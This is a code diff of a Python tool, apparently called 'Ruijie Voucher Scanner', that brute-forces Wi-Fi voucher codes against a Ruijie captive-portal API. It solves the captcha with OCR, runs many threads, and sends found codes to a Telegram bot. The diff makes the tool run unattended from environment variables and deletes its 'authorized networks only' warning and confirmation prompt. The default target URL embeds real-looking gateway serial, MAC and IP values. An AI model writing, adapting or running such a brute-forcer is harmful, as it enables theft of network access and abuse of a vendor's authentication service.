@@ -1,10 +1,6 @@
-
 #!/usr/bin/env python3
 # ==============================================
-#  Ruijie Voucher Scanner  —  v7.1 (Render Edition)
-#  - Environment variables for tokens
-#  - Telegram notifications
-#  - Real-time stats (Speed, Tried, Hits)
+#  Ruijie Voucher Scanner  —  v7.1 (Render Edition - No Input)
 # ==============================================
 
 import requests
@@ -41,12 +37,11 @@ else:
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # =============================================
-#  COLORS -- Neon terminal palette
+#  COLORS
 # =============================================
 class C:
     RESET   = "\033[0m"
     BOLD    = "\033[1m"
-    DIM     = "\033[2m"
     RED     = "\033[91m"
     GREEN   = "\033[92m"
     YELLOW  = "\033[93m"
@@ -60,26 +55,14 @@ def cprint(text, color=C.WHITE, bold=False, end="\n"):
     b = C.BOLD if bold else ""
     print(f"{b}{color}{text}{C.RESET}", end=end)
 
-def clear_screen():
-    os.system("cls" if os.name == "nt" else "clear")
-
-def print_banner():
-    clear_screen()
-    print(f"""
-{C.CYAN}╔══════════════════════════════════════════════════════════════════╗
-    🔥 RUIJIE VOUCHER SCANNER - RENDER EDITION                
-    ⚡ 6,7,8,9 Digit | Lower | Mixed                  
-    👤 @ArrowDemon2006                   
-╚══════════════════════════════════════════════════════════════════╝{C.RESET}
-    """)
-
-# ========== CONFIGURATION (from Environment Variables) ==========
+# ========== CONFIG (from Environment Variables) ==========
 TARGET_URL = os.getenv("TARGET_URL", "https://portal-as.ruijienetworks.com/api/auth/wifidog?stage=portal&gw_id=9cce887e2b7e&gw_sn=H1U72QB006007&gw_address=192.168.110.1&gw_port=2060&ip=192.168.110.46&mac=30:f2:3c:ef:bf:37&slot_num=8&nasip=192.168.1.38&ssid=VLAN233&ustate=0&mac_req=1&url=http%3A%2F%2F192.168.0.1%2F&chap_id=%5C140&chap_challenge=%5C037%5C061%5C072%5C122%5C040%5C141%5C252%5C331%5C122%5C375%5C042%5C015%5C130%5C263%5C365%5C222%5C")
+MODE = os.getenv("MODE", "6")  # 6, 7, 8, 9, lower6, lower7, lower8, mixed6, mixed7, mixed8
 THREADS = int(os.getenv("THREADS", "50"))
 TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
 TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID", "")
 FOUND_FILE = "found_voucher.txt"
-RESULT_FILE = os.path.expanduser("~/scan_results.txt")
+RESULT_FILE = "scan_results.txt"
 
 # =============================================
 #  TELEGRAM
@@ -153,9 +136,7 @@ async def get_session_id(sess, session_url, previous=None):
         return previous
 
 async def Captcha_Image(sess, session_id):
-    headers = {
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36',
-    }
+    headers = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/139.0.0.0 Safari/537.36'}
     async with sess.get(
         'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
         params={'sessionId': session_id, '_t': str(time.time())},
@@ -289,7 +270,23 @@ def stats_printer():
         sys.stdout.flush()
     print()
 
-async def run_scan(session_url, start_code, end_code, workers, code_list=None):
+def parse_mode(mode_str):
+    if mode_str == "6":
+        return "digit", 0, 999999
+    elif mode_str == "7":
+        return "digit", 0, 9999999
+    elif mode_str == "8":
+        return "digit", 0, 99999999
+    elif mode_str == "9":
+        return "digit", 0, 999999999
+    elif mode_str.startswith("lower"):
+        return "letter", int(mode_str.replace("lower", "")), None
+    elif mode_str.startswith("mixed"):
+        return "mixed", int(mode_str.replace("mixed", "")), None
+    else:
+        return "digit", 0, 999999
+
+async def run_scan(session_url, start_code, end_code, workers):
     global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
     _init_ocr()
     tried = 0
@@ -300,14 +297,9 @@ async def run_scan(session_url, start_code, end_code, workers, code_list=None):
     stop_flag = False
     _connector = aiohttp.TCPConnector(limit=workers + 100, ssl=False)
     _voucher_sem = asyncio.Semaphore(workers)
-    if code_list:
-        all_codes = code_list
-        total = len(all_codes)
-        code_iter = iter(all_codes)
-    else:
-        digits = max(len(str(start_code)), len(str(end_code)))
-        total = end_code - start_code + 1
-        code_iter = iter_range_codes(start_code, end_code)
+    digits = max(len(str(start_code)), len(str(end_code)))
+    total = end_code - start_code + 1
+    code_iter = iter_range_codes(start_code, end_code)
     cprint(f"\n  [+] Mode: Digit-only ({digits}-digit)", C.CYAN, bold=True)
     cprint(f"  [+] Range: {str(start_code).zfill(digits)} -> {str(end_code).zfill(digits)} ({total:,} codes)", C.YELLOW)
     cprint(f"  [+] Workers: {workers}\n", C.GREEN)
@@ -348,83 +340,6 @@ async def run_scan(session_url, start_code, end_code, workers, code_list=None):
     else:
         cprint("  [-] No valid voucher found.", C.RED)
         send_telegram(f"Scan finished on {session_url}\nTried {tried} codes, no hits.")
-
-def main():
-    global stop_flag
-    clear_screen()
-    print_banner()
-    cprint("  ── TARGET URL ──────────────────────────────", C.BLUE, bold=True)
-    cprint(f"  Default: {TARGET_URL[:60]}...", C.GRAY)
-    use_default = input(f"  {C.CYAN}[?] Use default URL? (y/n): {C.RESET}").strip().lower()
-    if use_default == "y" or use_default == "":
-        session_url = TARGET_URL
-    else:
-        session_url = input(f"  {C.CYAN}[?] Enter Session URL: {C.RESET}").strip()
-        if not session_url:
-            cprint("  [-] No URL provided. Using default.", C.RED)
-            session_url = TARGET_URL
-    cprint(f"  [+] Target set.", C.GREEN)
-    print()
-    # Mode selection
-    cprint("  🔢 Select Scan Mode:", C.CYAN, bold=True)
-    print("  1. 6-digit (000000-999999)")
-    print("  2. 7-digit (0000000-9999999)")
-    print("  3. 8-digit (00000000-99999999)")
-    print("  4. 9-digit (000000000-999999999)")
-    print("  5. 6-letter (a-z)")
-    print("  6. 7-letter (a-z)")
-    print("  7. 8-letter (a-z)")
-    print("  8. Mixed 6 (a-z+0-9)")
-    print("  9. Mixed 7 (a-z+0-9)")
-    print("  10. Mixed 8 (a-z+0-9)")
-    choice = input(f"  {C.CYAN}[💬] Select mode (1-10): {C.RESET}").strip()
-    if choice == "1":
-        mode_type = "digit"
-        start_code, end_code = 0, 999999
-    elif choice == "2":
-        mode_type = "digit"
-        start_code, end_code = 0, 9999999
-    elif choice == "3":
-        mode_type = "digit"
-        start_code, end_code = 0, 99999999
-    elif choice == "4":
-        mode_type = "digit"
-        start_code, end_code = 0, 999999999
-    elif choice == "5":
-        mode_type = "letter"
-        length = 6
-    elif choice == "6":
-        mode_type = "letter"
-        length = 7
-    elif choice == "7":
-        mode_type = "letter"
-        length = 8
-    elif choice == "8":
-        mode_type = "mixed"
-        length = 6
-    elif choice == "9":
-        mode_type = "mixed"
-        length = 7
-    elif choice == "10":
-        mode_type = "mixed"
-        length = 8
-    else:
-        cprint("  [-] Invalid choice. Using 6-digit default.", C.RED)
-        mode_type = "digit"
-        start_code, end_code = 0, 999999
-    print()
-    workers_inp = input(f"  {C.CYAN}[?] Workers (default {THREADS}): {C.RESET}").strip()
-    workers = int(workers_inp) if workers_inp else THREADS
-    print()
-    cprint("  [!!] Use only on authorized networks!", C.RED, bold=True)
-    confirm = input(f"  {C.YELLOW}[?] Type 'yes' to start: {C.RESET}").strip().lower()
-    if confirm != "yes":
-        cprint("  [-] Aborted.", C.RED)
-        sys.exit(0)
-    if mode_type in ("letter", "mixed"):
-        asyncio.run(_run_random_scan(session_url, length, workers, mode_type))
-    else:
-        asyncio.run(run_scan(session_url, start_code, end_code, workers))
 
 async def _run_random_scan(session_url, length, workers, mode_type="digit"):
     global _voucher_sem, stop_flag, _connector, tried, hits, found_codes, limited_codes, retry_total, start_time
@@ -481,6 +396,19 @@ async def _run_random_scan(session_url, length, workers, mode_type="digit"):
     else:
         cprint("  [-] No valid voucher found.", C.RED)
         send_telegram(f"Scan finished\nTried {tried} codes, no hits.")
+
+def main():
+    global stop_flag
+    mode_type, start_code, end_code = parse_mode(MODE)
+    session_url = TARGET_URL
+    workers = THREADS
+    cprint(f"\n  🚀 Starting scan with Mode: {MODE}", C.CYAN, bold=True)
+    cprint(f"  📡 URL: {session_url[:60]}...", C.GRAY)
+    cprint(f"  ⚡ Workers: {workers}\n", C.GREEN)
+    if mode_type in ("letter", "mixed"):
+        asyncio.run(_run_random_scan(session_url, start_code, workers, mode_type))
+    else:
+        asyncio.run(run_scan(session_url, start_code, end_code, workers))
 
 if __name__ == "__main__":
     try:
